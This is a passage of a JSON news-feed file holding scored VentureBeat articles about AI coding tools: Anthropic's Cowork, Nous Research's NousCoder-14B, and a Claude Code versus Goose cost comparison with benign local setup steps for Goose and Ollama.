join a waitlist for future access.</p><p>Anthropic has signaled clear intentions to expand the feature&#x27;s reach. The blog post explicitly mentions plans to add cross-device sync and bring Cowork to Windows as the company learns from the research preview.</p><p>Cherny set expectations appropriately, describing the product as &quot;early and raw, similar to what Claude Code felt like when it first launched.&quot;</p><p>To access <a href=\"https://claude.com/blog/cowork-research-preview\">Cowork</a>, Max subscribers can download or update the Claude macOS app and click on &quot;Cowork&quot; in the sidebar.</p><h2><b>The real question facing enterprise AI adoption</b></h2><p>For technical decision-makers, the implications of Cowork extend beyond any single product launch. The bottleneck for AI adoption is shifting — no longer is model intelligence the limiting factor, but rather workflow integration and user trust.</p><p>Anthropic&#x27;s goal, as the company puts it, is to make working with Claude feel less like operating a tool and more like delegating to a colleague. Whether mainstream users are ready to hand over folder access to an AI that might misinterpret their instructions remains an open question.</p><p>But the speed of Cowork&#x27;s development — a major feature built in ten days, possibly by the company&#x27;s own AI — previews a future where the capabilities of these systems compound faster than organizations can evaluate them. </p><p>The chatbot has learned to use a file manager. What it learns to use next is anyone&#x27;s guess.</p>",
        "source": "venturebeat.com",
        "published": "Mon, 12 Jan 2026 11:30:00 GMT",
        "fetched_at": "2026-02-09T23:33:24.833465Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "value_redefinition",
            "score": 8
          },
          {
            "name": "scale_shift",
            "score": 8
          },
          {
            "name": "ontology_shift",
            "score": 8
          }
        ],
        "structural_score": 40,
        "timeliness_score": 3,
        "final_score": 21.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://venturebeat.com/technology/nous-researchs-nouscoder-14b-is-an-open-source-coding-model-landing-right-in",
        "title": "Nous Research's NousCoder-14B is an open-source coding model landing right in the Claude Code moment",
        "summary": "<p><a href=\"https://nousresearch.com/\">Nous Research</a>, the open-source artificial intelligence startup backed by crypto venture firm <a href=\"https://www.paradigm.xyz/\">Paradigm</a>, released a new competitive programming model on Monday that it says matches or exceeds several larger proprietary systems — trained in just four days using 48 of Nvidia&#x27;s latest <a href=\"https://www.nvidia.com/en-us/data-center/dgx-b200/\">B200 graphics processors</a>.</p><p>The model, called <a href=\"https://huggingface.co/NousResearch/NousCoder-14B\">NousCoder-14B</a>, is another entry in a crowded field of AI coding assistants, but arrives at a particularly charged moment: <a href=\"https://claude.com/product/claude-code\">Claude Code</a>, the agentic programming tool from rival Anthropic, has dominated social media discussion since New Year&#x27;s Day, with developers posting <a href=\"https://x.com/0xDesigner/status/2008202211738648767?s=20\">breathless</a> <a href=\"https://x.com/hayesdev_/status/2008043379805048948\">testimonials</a> <a href=\"https://x.com/0xDesigner/status/2008202211738648767?s=20\">about its capabilities</a>. The simultaneous developments underscore how quickly AI-assisted software development is evolving — and how fiercely companies large and small are competing to capture what many believe will become a foundational technology for how software gets written.</p><p><span>type: <!-- -->embedded-entry-inline<!-- --> id: <!-- -->74cSyrq6OUrp9SEQ5zOUSl</span></p><p><a href=\"https://nousresearch.com/nouscoder-14b-a-competitive-olympiad-programming-model/\">NousCoder-14B</a> achieves a 67.87 percent accuracy rate on <a href=\"https://livecodebench.github.io/\">LiveCodeBench v6</a>, a standardized evaluation that tests models on competitive programming problems published between August 2024 and May 2025. That figure represents a 7.08 percentage point improvement over the base model it was trained from, Alibaba&#x27;s <a href=\"https://huggingface.co/Qwen/Qwen3-14B\">Qwen3-14B</a>, according to Nous Research&#x27;s technical report published alongside the release.</p><p>&quot;I gave Claude Code a description of the problem, it generated what we built last year in an hour,&quot; <a href=\"https://www.reddit.com/r/OpenAI/comments/1q2uuil/google_engineer_im_not_joking_and_this_isnt_funny/\">wrote Jaana Dogan</a>, a principal engineer at Google responsible for the Gemini API, in a viral post on X last week that captured the prevailing mood around AI coding tools. Dogan was describing a distributed agent orchestration system her team had spent a year developing — a system Claude Code approximated from a three-paragraph prompt.</p><p>The juxtaposition is instructive: while Anthropic&#x27;s <a href=\"https://venturebeat.com/technology/the-creator-of-claude-code-just-revealed-his-workflow-and-developers-are\">Claude Code has captured imaginations</a> with demonstrations of end-to-end software development, Nous Research is betting that open-source alternatives trained on verifiable problems can close the gap — and that transparency in how these models are built matters as much as raw capability.</p><hr /><h2><b>How Nous Research built an AI coding model that anyone can replicate</b></h2><p>What distinguishes the <a href=\"https://huggingface.co/NousResearch/NousCoder-14B\">NousCoder-14B</a> release from many competitor announcements is its radical openness. Nous Research published not just the <a href=\"https://huggingface.co/NousResearch/NousCoder-14B\">model weights</a> but the <a href=\"https://github.com/NousResearch/atropos/pull/296\">complete reinforcement learning environment</a>, benchmark suite, and training harness — built on the company&#x27;s <a href=\"https://github.com/NousResearch/atropos/pull/296\">Atropos framework </a>— enabling any researcher with sufficient compute to <a href=\"https://wandb.ai/jli505/qwen14b/reports/HermesCoder-14B--VmlldzoxNTQ5Nzc0MQ?accessToken=4pt3stwyh4x83zqe2jgoo5j9b7j07jbe5omf2n40lray3tih17vfkavjootvnw8o\">reproduce or extend the work</a>.</p><p>&quot;Open-sourcing the Atropos stack provides the necessary infrastructure for reproducible olympiad-level reasoning research,&quot; <a href=\"https://x.com/o_mega___/status/2008907268700475450?s=20\">noted one observer on X</a>, summarizing the significance for the academic and open-source communities.</p><p>The model was trained by <a href=\"https://x.com/JoeLi5050\">Joe Li</a>, a researcher in residence at Nous Research and a former competitive programmer himself. Li&#x27;s <a href=\"https://nousresearch.com/nouscoder-14b-a-competitive-olympiad-programming-model/\">technical report </a>reveals an unexpectedly personal dimension: he compared the model&#x27;s improvement trajectory to his own journey on Codeforces, the competitive programming platform where participants earn ratings based on contest performance.</p><p>Based on rough estimates mapping LiveCodeBench scores to Codeforces ratings, Li calculated that NousCoder-14B&#x27;s improvemen t— from approximately the 1600-1750 rating range to 2100-2200 — mirrors a leap that took him nearly two years of sustained practice between ages 14 and 16. The model accomplished the equivalent in four days.</p><p>&quot;Watching that final training run unfold was quite a surreal experience,&quot; Li wrote in the technical report.</p><p>But Li was quick to note an important caveat that speaks to broader questions about AI efficiency: he solved roughly 1,000 problems during those two years, while the model required 24,000. Humans, at least for now, remain dramatically more sample-efficient learners.</p><hr /><h2><b>Inside the reinforcement learning system that trains on 24,000 competitive programming problems</b></h2><p><a href=\"https://huggingface.co/NousResearch/NousCoder-14B\">NousCoder-14B</a>&#x27;s training process offers a window into the increasingly sophisticated techniques researchers use to improve AI reasoning capabilities through reinforcement learning.</p><p>The approach relies on what researchers call &quot;verifiable rewards&quot; — a system where the model generates code solutions, those solutions are executed against test cases, and the model receives a simple binary signal: correct or incorrect. This feedback loop, while conceptually straightforward, requires significant infrastructure to execute at scale.</p><p>Nous Research used <a href=\"https://modal.com/\">Modal</a>, a cloud computing platform, to run sandboxed code execution in parallel. Each of the 24,000 training problems contains hundreds of test cases on average, and the system must verify that generated code produces correct outputs within time and memory constraints — 15 seconds and 4 gigabytes, respectively.</p><p>The training employed a technique called <a href=\"https://dapo-sia.github.io/\">DAPO (Dynamic Sampling Policy Optimization)</a>, which the researchers found performed slightly better than alternatives in their experiments. A key innovation involves &quot;dynamic sampling&quot; — discarding training examples where the model either solves all attempts or fails all attempts, since these provide no useful gradient signal for learning.</p><p>The researchers also adopted &quot;iterative context extension,&quot; first training the model with a 32,000-token context window before expanding to 40,000 tokens. During evaluation, extending the context further to approximately 80,000 tokens produced the best results, with accuracy reaching 67.87 percent.</p><p>Perhaps most significantly, the training pipeline overlaps inference and verification — as soon as the model generates a solution, it begins work on the next problem while the previous solution is being checked. This pipelining, combined with asynchronous training where multiple model instances work in parallel, maximizes hardware utilization on expensive GPU clusters.</p><hr /><h2><b>The looming data shortage that could slow AI coding model progress</b></h2><p>Buried in Li&#x27;s <a href=\"https://nousresearch.com/nouscoder-14b-a-competitive-olympiad-programming-model/\">technical report</a> is a finding with significant implications for the future of AI development: the training dataset for NousCoder-14B encompasses &quot;a significant portion of all readily available, verifiable competitive programming problems in a standardized dataset format.&quot;</p><p>In other words, for this particular domain, the researchers are approaching the limits of high-quality training data.</p><p>&quot;The total number of competitive programming problems on the Internet is roughly the same order of magnitude,&quot; Li wrote, referring to the 24,000 problems used for training. &quot;This suggests that within the competitive programming domain, we have approached the limits of high-quality data.&quot;</p><p>This observation echoes growing concern across the AI industry about data constraints. While compute continues to scale according to well-understood economic and engineering principles, training data is &quot;increasingly finite,&quot; as Li put it.</p><p>&quot;It appears that some of the most important research that needs to be done in the future will be in the areas of synthetic data generation and data efficient algorithms and architectures,&quot; he concluded.</p><p>The challenge is particularly acute for competitive programming because the domain requires problems with known correct solutions that can be verified automatically. Unlike natural language tasks where human evaluation or proxy metrics suffice, code either works or it doesn&#x27;t — making synthetic data generation considerably more difficult.</p><p>Li identified one potential avenue: training models not just to solve problems but to generate solvable problems, enabling a form of self-play similar to techniques that proved successful in game-playing AI systems. &quot;Once synthetic problem generation is solved, self-play becomes a very interesting direction,&quot; he wrote.</p><hr /><h2><b>A $65 million bet that open-source AI can compete with Big Tech</b></h2><p>Nous Research has carved out a distinctive position in the AI landscape: a company committed to <a href=\"https://nousresearch.com/\">open-source releases</a> that compete with — and sometimes exceed — proprietary alternatives.</p><p>The company raised<a href=\"https://fortune.com/crypto/2025/04/25/paradigm-nous-research-crypto-ai-venture-capital-deepseek-openai-blockchain/\"> $50 million in April 2025</a> in a round led by Paradigm, the cryptocurrency-focused venture firm founded by Coinbase co-founder Fred Ehrsam. Total funding reached $65 million, according to some reports. The investment reflected growing interest in decentralized approaches to AI training, an area where Nous Research has developed its <a href=\"https://psyche.network/\">Psyche platform</a>.</p><p>Previous releases include <a href=\"https://hermes4.nousresearch.com/\">Hermes 4</a>, a family of models that we reported &quot;<a href=\"https://venturebeat.com/ai/nous-research-drops-hermes-4-ai-models-that-outperform-chatgpt-without-content-restrictions\">outperform ChatGPT without content restrictions</a>,&quot; and DeepHermes-3, which the company described as the first &quot;<a href=\"https://venturebeat.com/ai/personalized-unrestricted-ai-lab-nous-research-launches-first-toggle-on-reasoning-model-deephermes-3\">toggle-on reasoning model</a>&quot; — allowing users to activate extended thinking capabilities on demand.</p><p>The company has cultivated a distinctive aesthetic and community, prompting some skepticism about whether style might overshadow substance. &quot;Ofc i&#x27;m gonna believe an anime pfp company. stop benchmarkmaxxing ffs,&quot; <a href=\"https://x.com/shydev69/status/2008654826356535510?s=20\">wrote one critic on X</a>, referring to Nous Research&#x27;s anime-style branding and the industry practice of optimizing for benchmark performance.</p><p>Others raised technical questions. &quot;<a href=\"https://x.com/yehor_smoliakov/status/2008659681489940757?s=20\">Based on the benchmark, Nemotron is better</a>,&quot; noted one commenter, referring to Nvidia&#x27;s family of language models. Another asked whether <a href=\"https://huggingface.co/NousResearch/NousCoder-14B\">NousCoder-14B</a> is &quot;agentic focused or just &#x27;one shot&#x27; coding&quot; — a distinction that matters for practical software development, where iterating on feedback typically produces better results than single attempts.</p><hr /><h2><b>What researchers say must happen next for AI coding tools to keep improving</b></h2><p>The release includes several directions for future work that hint at where AI coding research may be heading.</p><p>Multi-turn reinforcement learning tops the list. Currently, the model receives only a final binary reward — pass or fail — after generating a solution. But competitive programming problems typically include public test cases that provide intermediate feedback: compilation errors, incorrect outputs, time limit violations. Training models to incorporate this feedback across multiple attempts could significantly improve performance.</p><p>Controlling response length also remains a challenge. The researchers found that incorrect solutions tended to be longer than correct ones, and response lengths quickly saturated available context windows during training — a pattern that various algorithmic modifications failed to resolve.</p><p>Perhaps most ambitiously, Li proposed &quot;problem generation and self-play&quot; — training models to both solve and create programming problems. This would address the data scarcity problem directly by enabling models to generate their own training curricula.</p><p>&quot;Humans are great at generating interesting and useful problems for other competitive programmers, but it appears that there still exists a significant gap in LLM capabilities in creative problem generation,&quot; Li wrote.</p><p>The model is <a href=\"https://huggingface.co/NousResearch/NousCoder-14B\">available now on Hugging Face</a> under an Apache 2.0 license. For researchers and developers who want to build on the work, Nous Research has published the complete <a href=\"https://github.com/NousResearch/atropos/pull/296\">Atropos training stack</a> alongside it.</p><p>What took Li two years of adolescent dedication to achieve—climbing from a 1600-level novice to a 2100-rated competitor on Codeforces—an AI replicated in 96 hours. He needed 1,000 problems. The model needed 24,000. But soon enough, these systems may learn to write their own problems, teach themselves, and leave human benchmarks behind entirely.</p><p>The question is no longer whether machines can learn to code. It&#x27;s whether they&#x27;ll soon be better teachers than we ever were.</p><p>\n</p>",
        "source": "venturebeat.com",
        "published": "Wed, 07 Jan 2026 20:00:00 GMT",
        "fetched_at": "2026-02-09T23:33:24.833470Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "value_redefinition",
            "score": 8
          },
          {
            "name": "scale_shift",
            "score": 4
          },
          {
            "name": "ontology_shift",
            "score": 8
          }
        ],
        "structural_score": 32,
        "timeliness_score": 3,
        "final_score": 17.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://venturebeat.com/infrastructure/claude-code-costs-up-to-usd200-a-month-goose-does-the-same-thing-for-free",
        "title": "Claude Code costs up to $200 a month. Goose does the same thing for free.",
        "summary": "<p>The artificial intelligence coding revolution comes with a catch: it&#x27;s expensive.</p><p><a href=\"https://claude.com/product/claude-code\">Claude Code</a>, Anthropic&#x27;s terminal-based AI agent that can write, debug, and deploy code autonomously, has captured the imagination of software developers worldwide. But its <a href=\"https://claude.com/pricing\">pricing</a> — ranging from $20 to $200 per month depending on usage — has sparked a growing rebellion among the very programmers it aims to serve.</p><p>Now, a free alternative is gaining traction. <a href=\"https://block.github.io/goose/\">Goose</a>, an open-source AI agent developed by <a href=\"https://block.xyz/\">Block</a> (the financial technology company formerly known as Square), offers nearly identical functionality to <a href=\"https://claude.com/product/claude-code\">Claude Code</a> but runs entirely on a user&#x27;s local machine. No subscription fees. No cloud dependency. No rate limits that reset every five hours.</p><p>&quot;Your data stays with you, period,&quot; said Parth Sareen, a software engineer who demonstrated the tool during a <a href=\"https://www.youtube.com/watch?v=WG10r2N0IwM\">recent livestream</a>. The comment captures the core appeal: Goose gives developers complete control over their AI-powered workflow, including the ability to work offline — even on an airplane.</p><p>The project has exploded in popularity. Goose now boasts more than <a href=\"https://github.com/block/goose\">26,100 stars on GitHub</a>, the code-sharing platform, with 362 contributors and 102 releases since its launch. The latest version, <a href=\"https://block.github.io/goose/docs/getting-started/installation\">1.20.1</a>, shipped on January 19, 2026, reflecting a development pace that rivals commercial products.</p><p>For developers frustrated by Claude Code&#x27;s pricing structure and usage caps, Goose represents something increasingly rare in the AI industry: a genuinely free, no-strings-attached option for serious work.</p><div></div><h2><b>Anthropic&#x27;s new rate limits spark a developer revolt</b></h2><p>To understand why <a href=\"https://block.github.io/goose/\">Goose</a> matters, you need to understand the <a href=\"https://techcrunch.com/2025/07/17/anthropic-tightens-usage-limits-for-claude-code-without-telling-users/\">Claude Code pricing controversy</a>.</p><p>Anthropic, the San Francisco artificial intelligence company founded by former OpenAI executives, offers Claude Code as part of its subscription tiers. The free plan provides no access whatsoever. The <a href=\"https://www.anthropic.com/news/claude-pro\">Pro plan</a>, at $17 per month with annual billing (or $20 monthly), limits users to just 10 to 40 prompts every five hours — a constraint that serious developers exhaust within minutes of intensive work.</p><p>The <a href=\"https://support.claude.com/en/articles/11049741-what-is-the-max-plan\">Max plans</a>, at $100 and $200 per month, offer more headroom: 50 to 200 prompts and 200 to 800 prompts respectively, plus access to Anthropic&#x27;s most powerful model, <a href=\"https://www.anthropic.com/news/claude-opus-4-5\">Claude 4.5 Opus</a>. But even these premium tiers come with restrictions that have inflamed the developer community.</p><p>In late July, Anthropic announced new weekly rate limits. Under the system, Pro users receive 40 to 80 hours of Sonnet 4 usage per week. Max users at the $200 tier get 240 to 480 hours of Sonnet 4, plus 24 to 40 hours of Opus 4. Nearly five months later, the frustration has not subsided.</p><p>The problem? Those &quot;hours&quot; are not actual hours. They represent token-based limits that vary wildly depending on codebase size, conversation length, and the complexity of the code being processed. Independent analysis suggests the actual per-session limits translate to roughly 44,000 tokens for Pro users and 220,000 tokens for the $200 Max plan.</p><p>&quot;It&#x27;s confusing and vague,&quot; one developer wrote in a <a href=\"https://userjot.com/blog/claude-code-pricing-200-dollar-plan-worth-it\">widely shared analysis</a>. &quot;When they say &#x27;24-40 hours of Opus 4,&#x27; that doesn&#x27;t really tell you anything useful about what you&#x27;re actually getting.&quot;</p><p>The <a href=\"https://www.reddit.com/r/Anthropic/comments/1mbo4uw/claude_code_max_new_weekly_rate_limits/\">backlash on Reddit</a> and <a href=\"https://venturebeat.com/ai/anthropic-throttles-claude-rate-limits-devs-call-foul\">developer forums</a> has been fierce. Some users report hitting their daily limits within 30 minutes of intensive coding. Others have canceled their subscriptions entirely, calling the new restrictions &quot;a joke&quot; and &quot;unusable for real work.&quot;</p><p>Anthropic has defended the changes, stating that the limits affect fewer than five percent of users and target people running Claude Code &quot;<a href=\"https://techcrunch.com/2025/07/28/anthropic-unveils-new-rate-limits-to-curb-claude-code-power-users/\">continuously in the background, 24/7</a>.&quot; But the company has not clarified whether that figure refers to five percent of Max subscribers or five percent of all users — a distinction that matters enormously.</p><h2><b>How Block built a free AI coding agent that works offline</b></h2><p><a href=\"https://block.github.io/goose/\">Goose</a> takes a radically different approach to the same problem.</p><p>Built by <a href=\"https://block.xyz/\">Block</a>, the payments company led by Jack Dorsey, Goose is what engineers call an &quot;<a href=\"https://github.com/block/goose\">on-machine AI agent</a>.&quot; Unlike Claude Code, which sends your queries to Anthropic&#x27;s servers for processing, Goose can run entirely on your local computer using open-source language models that you download and control yourself.</p><p>The project&#x27;s documentation describes it as going &quot;<a href=\"https://github.com/block/goose\">beyond code suggestions</a>&quot; to &quot;install, execute, edit, and test with any LLM.&quot; That last phrase — &quot;any LLM&quot; — is the key differentiator. Goose is model-agnostic by design.</p><p>You can connect Goose to Anthropic&#x27;s <a href=\"https://platform.claude.com/docs/en/about-claude/models/overview\">Claude models</a> if you have <a href=\"https://claude.com/platform/api\">API access</a>. You can use OpenAI&#x27;s <a href=\"https://platform.openai.com/docs/models/gpt-5\">GPT-5</a> or Google&#x27;s <a href=\"https://ai.google.dev/gemini-api/docs\">Gemini</a>. You can route it through services like <a href=\"https://groq.com/\">Groq</a> or <a href=\"https://openrouter.ai/\">OpenRouter</a>. Or — and this is where things get interesting — you can run it entirely locally using tools like <a href=\"https://ollama.com/\">Ollama</a>, which let you download and execute open-source models on your own hardware.</p><p>The practical implications are significant. With a local setup, there are no subscription fees, no usage caps, no rate limits, and no concerns about your code being sent to external servers. Your conversations with the AI never leave your machine.</p><p>&quot;I use Ollama all the time on planes — it&#x27;s a lot of fun!&quot; <a href=\"https://www.youtube.com/watch?v=WG10r2N0IwM\">Sareen noted</a> during a demonstration, highlighting how local models free developers from the constraints of internet connectivity.</p><h2><b>What Goose can do that traditional code assistants can&#x27;t</b></h2><p><a href=\"https://block.github.io/goose/\">Goose</a> operates as a command-line tool or desktop application that can autonomously perform complex development tasks. It can build entire projects from scratch, write and execute code, debug failures, orchestrate workflows across multiple files, and interact with external APIs — all without constant human oversight.</p><p>The architecture relies on what the AI industry calls &quot;<a href=\"https://www.ibm.com/think/topics/tool-calling\">tool calling</a>&quot; or &quot;<a href=\"https://platform.openai.com/docs/guides/function-calling?api-mode=chat\">function calling</a>&quot; — the ability for a language model to request specific actions from external systems. When you ask <a href=\"https://block.github.io/goose/\">Goose</a> to create a new file, run a test suite, or check the status of a GitHub pull request, it doesn&#x27;t just generate text describing what should happen. It actually executes those operations.</p><p>This capability depends heavily on the underlying language model. <a href=\"https://platform.claude.com/docs/en/about-claude/models/overview\">Claude 4 models</a> from Anthropic currently perform best at tool calling, according to the <a href=\"https://gorilla.cs.berkeley.edu/leaderboard.html\">Berkeley Function-Calling Leaderboard</a>, which ranks models on their ability to translate natural language requests into executable code and system commands.</p><p>But newer open-source models are catching up quickly. Goose&#x27;s documentation highlights several options with strong tool-calling support: Meta&#x27;s <a href=\"https://www.llama.com/\">Llama series</a>, Alibaba&#x27;s <a href=\"https://qwen.ai/home\">Qwen models</a>, Google&#x27;s <a href=\"https://deepmind.google/models/gemma/\">Gemma variants</a>, and DeepSeek&#x27;s <a href=\"https://huggingface.co/deepseek-ai/DeepSeek-R1\">reasoning-focused architectures</a>.</p><p>The tool also integrates with the <a href=\"https://modelcontextprotocol.io/docs/getting-started/intro\">Model Context Protocol</a>, or MCP, an emerging standard for connecting AI agents to external services. Through MCP, Goose can access databases, search engines, file systems, and third-party APIs — extending its capabilities far beyond what the base language model provides.</p><h2><b>Setting Up Goose with a Local Model</b></h2><p>For developers interested in a completely free, privacy-preserving setup, the process involves three main components: <a href=\"https://block.github.io/goose/\">Goose</a> itself, <a href=\"https://ollama.com/\">Ollama</a> (a tool for running open-source models locally), and a compatible language model.</p><p><b>Step 1: Install Ollama</b></p><p><a href=\"https://ollama.com/\">Ollama</a> is an open-source project that dramatically simplifies the process of running large language models on personal hardware. It handles the complex work of downloading, optimizing, and serving models through a simple interface.</p><p>Download and install Ollama from <a href=\"http://ollama.com\">ollama.com</a>. Once installed, you can pull models with a single command. For coding tasks, <a href=\"https://qwen.ai/blog?id=qwen2.5-max\">Qwen 2.5</a> offers strong tool-calling support:</p><p>ollama run qwen2.5</p><p>The model downloads automatically and begins running on your machine.</p><p><b>Step 2: Install Goose</b></p><p><a href=\"https://block.github.io/goose/\">Goose</a> is available as both a desktop application and a command-line interface. The desktop version provides a more visual experience, while the CLI appeals to developers who prefer working entirely in the terminal.</p><p>Installation instructions vary by operating system but generally involve downloading from Goose&#x27;s <a href=\"https://github.com/block/goose\">GitHub releases page</a> or using a package manager. Block provides pre-built binaries for macOS (both Intel and Apple Silicon), Windows, and Linux.</p><p><b>Step 3: Configure the Connection</b></p><p>In Goose Desktop, navigate to Settings, then Configure Provider, and select Ollama. Confirm that the API Host is set to http://localhost:11434 (Ollama&#x27;s default port) and click Submit.</p><p>For the command-line version, run goose configure, select &quot;Configure Providers,&quot; choose Ollama, and enter the model name when prompted.</p><p>That&#x27;s it. Goose is now connected to a language model running entirely on your hardware, ready to execute complex coding tasks without any subscription fees or external dependencies.</p><h2><b>The RAM, processing power, and trade-offs you should know about</b></h2><p>The obvious question: what kind of computer do you need?</p><p>Running large language models locally requires substantially more computational resources than typical software. The key constraint is memory — specifically, RAM on most systems, or VRAM if using a dedicated graphics card for acceleration.</p><p>Block&#x27;s <a href=\"https://block.github.io/goose/docs/category/guides\">documentation</a> suggests that 32 gigabytes of RAM provides &quot;a solid baseline for larger models and outputs.&quot; For Mac users, this means the computer&#x27;s unified memory is the primary bottleneck. For Windows and Linux users with discrete NVIDIA graphics cards, GPU memory (VRAM) matters more for acceleration.</p><p>But you don&#x27;t necessarily need expensive hardware to get started. Smaller models with fewer parameters run on much more modest systems. <a href=\"https://qwen.ai/blog?id=qwen2.5-max\">Qwen 2.5</a>, for instance, comes in multiple sizes, and the smaller variants can operate effectively on machines with 16 gigabytes of RAM.</p><p>&quot;You don&#x27;t need to run the largest models to get excellent results,&quot; <a href=\"https://www.youtube.com/watch?v=WG10r2N0IwM\">Sareen emphasized</a>. The practical recommendation: start with a smaller model to test your workflow, then scale up as needed.</p><p>For context, Apple&#x27;s entry-level <a href=\"https://www.apple.com/macbook-air/\">MacBook Air</a> with 8 gigabytes of RAM would struggle with most capable coding models. But a <a href=\"https://www.apple.com/macbook-pro/\">MacBook Pro</a> with 32 gigabytes — increasingly common among professional developers — handles them comfortably.</p><h2><b>Why keeping your code off the cloud matters more than ever</b></h2><p><a href=\"https://block.github.io/goose/\">Goose</a> with a local LLM is not a perfect substitute for <a href=\"https://claude.com/product/claude-code\">Claude Code</a>. The comparison involves real trade-offs that developers should understand.</p><p><b>Model Quality</b>: <a href=\"https://www.anthropic.com/news/claude-opus-4-5\">Claude 4.5 Opus</a>, Anthropic&#x27;s flagship model, remains arguably the most capable AI for software engineering tasks. It excels at understanding complex codebases, following nuanced instructions, and producing high-quality code on the first attempt. Open-source models have improved dramatically, but a gap persists — particularly for the most challenging tasks.</p><p>One developer who switched to the $200 Claude Code plan <a href=\"https://userjot.com/blog/claude-code-pricing-200-dollar-plan-worth-it\">described the difference bluntly</a>: &quot;When I say &#x27;make this look modern,&#x27; Opus knows what I mean. Other models give me Bootstrap circa 2015.&quot;</p><p><b>Context Window</b>: <a href=\"https://www.anthropic.com/news/claude-sonnet-4-5\">Claude Sonnet 4.5</a>, accessible through the API, offers a massive one-million-token context window — enough to load entire large codebases without chunking or context management issues. Most local models are limited to 4,096 or 8,192 tokens by default, though many can be configured for longer contexts at the cost of increased memory usage and slower processing.</p><p><b>Speed</b>: Cloud-based services like <a href=\"https://claude.com/product/claude-code\">Claude Code</a> run on dedicated server hardware optimized for AI inference. Local models, running on consumer laptops, typically process requests more slowly. The difference matters for iterative workflows where you&#x27;re making rapid changes and waiting for AI feedback.</p><p><b>Tooling Maturity</b>: <a href=\"https://claude.com/product/claude-code\">Claude Code</a> benefits from Anthropic&#x27;s dedicated engineering resources. Features like prompt caching (which can reduce costs by up to 90 percent for repeated contexts) and structured outputs are polished and well-documented. <a href=\"https://block.github.io/goose/\">Goose</a>, while actively developed with 102 releases to date, relies on community contributions and may lack equivalent refinement in specific areas.</p><h2><b>How Goose stacks up against Cursor, GitHub Copilot, and the paid AI coding market</b></h2><p>Goose enters a crowded market of AI coding tools, but occupies a distinctive position.</p><p><a href=\"https://cursor.com/\">Cursor</a>, a popular AI-enhanced code editor, charges $20 per month for its <a href=\"https://cursor.com/pricing\">Pro tier</a> and $200 for <a href=\"https://cursor.com/pricing\">Ultra</a>—pricing that mirrors <a href=\"https://claude.com/pricing\">Claude Code&#x27;s Max plans</a>. Cursor provides approximately 4,500 Sonnet 4 requests per month at the Ultra level, a substantially different allocation model than Claude Code&#x27;s hourly resets.</p><p><a href=\"https://cline.bot/\">Cline</a>, <a href=\"https://roocode.com/\">Roo Code</a>, and similar open-source projects offer AI coding assistance but with varying levels of autonomy and tool integration. Many focus on code completion rather than the agentic task execution that defines Goose and Claude Code.</p><p>Amazon&#x27;s <a href=\"https://aws.amazon.com/blogs/aws/now-in-preview-amazon-codewhisperer-ml-powered-coding-companion/\">CodeWhisperer</a>, <a href=\"https://github.com/features/copilot\">GitHub Copilot</a>, and enterprise offerings from major cloud providers target large organizations with complex procurement processes and dedicated budgets. They are less relevant to individual developers and small teams seeking lightweight, flexible tools.</p><p>Goose&#x27;s combination of genuine autonomy, model agnosticism, local operation, and zero cost creates a unique value proposition. The tool is not trying to compete with commercial offerings on polish or model quality. It&#x27;s competing on freedom — both financial and architectural.</p><h2><b>The $200-a-month era for AI coding tools may be ending</b></h2><p>The AI coding tools market is evolving quickly. Open-source models are improving at a pace that continually narrows the gap with proprietary alternatives. Moonshot AI&#x27;s <a href=\"https://www.kimi.com/en\">Kimi K2</a> and z.ai&#x27;s <a href=\"https://z.ai/blog/glm-4.5\">GLM 4.5</a> now benchmark near <a href=\"https://www.anthropic.com/news/claude-4\">Claude Sonnet 4 levels</a> — and they&#x27;re freely available.</p><p>If this trajectory continues, the quality advantage that justifies Claude Code&#x27;s premium pricing may erode. Anthropic would then face pressure to compete on features, user experience, and integration rather than raw model capability.</p><p>For now, developers face a clear choice. Those who need the absolute best model quality, who can afford premium pricing, and who accept usage restrictions may prefer <a href=\"https://claude.com/product/claude-code\">Claude Code</a>. Those who prioritize cost, privacy, offline access, and flexibility have a genuine alternative in <a href=\"https://block.github.io/goose/\">Goose</a>.</p><p>The fact that a $200-per-month commercial product has a zero-dollar open-source competitor with comparable core functionality is itself remarkable. It reflects both the maturation of open-source AI infrastructure and the appetite among developers for tools that respect their autonomy.</p><p>Goose is not perfect. It requires more technical setup than commercial alternatives. It depends on hardware resources that not every developer possesses. Its model options, while improving rapidly, still trail the best proprietary offerings on complex tasks.</p><p>But for a growing community of developers, those limitations are acceptable trade-offs for something increasingly rare in the AI landscape: a tool that truly belongs to them.</p><hr /><p><i>Goose is available for download at </i><a href=\"http://github.com/block/goose\"><i>github.com/block/goose</i></a><i>. Ollama is available at </i><a href=\"http://ollama.com\"><i>ollama.com</i></a><i>. Both projects are free and open source.</i></p>",
        "source": "venturebeat.com",
        "published": "Mon, 19 Jan 2026 14:00:00 GMT",
        "fetched_at": "2026-02-09T23:33:24.833442Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 4
          },
          {
            "name": "value_redefinition",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 8
          },
          {
            "name": "ontology_shift",
            "score": 8
          }
        ],
        "structural_score": 24,
        "timeliness_score": 3,
        "final_score": 13.5,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://venturebeat.com/technology/the-creator-of-claude-code-just-revealed-his-workflow-and-developers-are",
        "title": "The creator of Claude Code just revealed his workflow, and developers are losing their minds",
